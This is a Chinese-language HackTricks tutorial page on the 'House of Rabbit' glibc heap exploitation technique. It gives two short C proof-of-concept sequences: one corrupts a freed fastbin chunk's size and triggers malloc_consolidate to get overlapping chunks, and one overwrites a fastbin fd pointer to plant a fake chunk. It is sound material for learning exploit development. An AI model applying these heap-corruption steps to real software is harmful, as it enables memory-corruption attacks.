# 兔子之屋

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

### 需求

1. **能够修改快速分配（fast bin）的fd指针或大小**：这意味着您可以更改快速分配中块的前向指针或大小。
2. **能够触发`malloc_consolidate`**：这可以通过分配大块或合并顶部块来实现，从而强制堆合并块。

### 目标

1. **创建重叠块**：使一个块与另一个块重叠，从而允许进一步的堆操作。
2. **伪造假块**：欺骗分配器，在堆操作期间将伪造的块视为合法块。

## 攻击步骤

### POC 1：修改快速分配块的大小

**目标**：通过操纵快速分配块的大小来创建重叠块。

* **步骤1：分配块**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **步骤 2: 释放块**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
* **步骤 3: 修改块大小**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **步骤 4: 触发 `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
分配一个大块会触发`malloc_consolidate`函数，合并快速分配区中的小块。`chunk1`的操纵大小导致它与`chunk2`重叠。

在合并后，`chunk1`与`chunk2`重叠，从而可以进一步利用。

### POC 2: 修改`fd`指针

**目标**：通过操纵快速分配区的`fd`指针来创建一个伪造的块。

* **步骤 1：分配块**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**解释**：我们分配两个块，一个较小，一个较大，以设置堆以用于伪造块。

* **步骤 2：创建伪造块**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **步骤 3: 释放 `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**解释**：我们释放`chunk1`，将其添加到fastbin列表。

- **步骤 4：修改`chunk1`的`fd`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**解释**：我们将`chunk1`的前向指针(`fd`)更改为指向`chunk2`内部的我们伪造的块。

- **步骤 5：触发`malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
分配一个大块内存会再次触发 `malloc_consolidate`，这将处理伪造的块。

伪造的块会成为快速分配链表的一部分，使其成为进一步利用的合法块。

### 摘要

**House of Rabbit** 技术涉及修改快速分配链表块的大小以创建重叠块，或者操纵 `fd` 指针以创建伪造块。这使攻击者能够在堆中伪造合法块，从而实现各种形式的利用。理解并实践这些步骤将增强您的堆利用技能。
